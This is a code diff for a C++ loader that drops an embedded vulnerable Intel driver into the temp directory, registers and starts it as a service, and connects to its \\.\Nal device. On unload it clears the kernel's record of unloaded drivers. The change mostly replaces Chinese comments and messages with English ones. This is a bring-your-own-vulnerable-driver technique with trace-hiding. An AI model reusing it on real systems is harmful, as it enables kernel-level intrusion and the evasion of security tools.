@@ -2,59 +2,50 @@
 
 bool intel_driver::IsRunning()
 {
-	//看看漏洞驱动是否运行
 	const HANDLE file_handle = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-
-	//驱动有运行
 	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
 	{
 		CloseHandle(file_handle);
 		return true;
 	}
-
-	//驱动没运行
 	return false;
 }
 
 HANDLE intel_driver::Load()
 {
-	std::cout << "[<] 尝试加载漏洞驱动" << std::endl;
+	std::cout << "[<] Loading vulnerable driver" << std::endl;
 
-	//获取临时文件目录
 	char temp_directory[MAX_PATH] = { 0 };
 	const uint32_t get_temp_path_ret = GetTempPathA(sizeof(temp_directory), temp_directory);
+
 	if (!get_temp_path_ret || get_temp_path_ret > MAX_PATH)
 	{
-		std::cout << "[-] 无法获取临时文件目录" << std::endl;
+		std::cout << "[-] Failed to get temp path" << std::endl;
 		return nullptr;
 	}
 
-	//如果有，删除临时文件里面的漏洞驱动
 	const std::string driver_path = std::string(temp_directory) + "\\" + driver_name;
 	std::remove(driver_path.c_str());
 
-	//从内存中创建文件
 	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(intel_driver_resource::driver), sizeof(intel_driver_resource::driver)))
 	{
-		std::cout << "[-] 无法创建漏洞驱动" << std::endl;
+		std::cout << "[-] Failed to create vulnerable driver file" << std::endl;
 		return nullptr;
 	}
 
-	//注册漏洞驱动并开始运行
 	if (!service::RegisterAndStart(driver_path))
 	{
-		std::cout << "[-] 无法注册和运行漏洞驱动,请确保CMD以管理员方式运行" << std::endl;
+		std::cout << "[-] Failed to register and start service for the vulnerable driver" << std::endl;
 		std::remove(driver_path.c_str());
 		return nullptr;
 	}
 
-	//与漏洞驱动取得连接
 	return CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 }
 
 void intel_driver::Unload(HANDLE device_handle)
 {
-	std::cout << "[<] 准备卸载漏洞驱动" << std::endl;
+	std::cout << "[<] Unloading vulnerable driver" << std::endl;
 
 	ClearMmUnloadedDrivers(device_handle);
 	CloseHandle(device_handle);
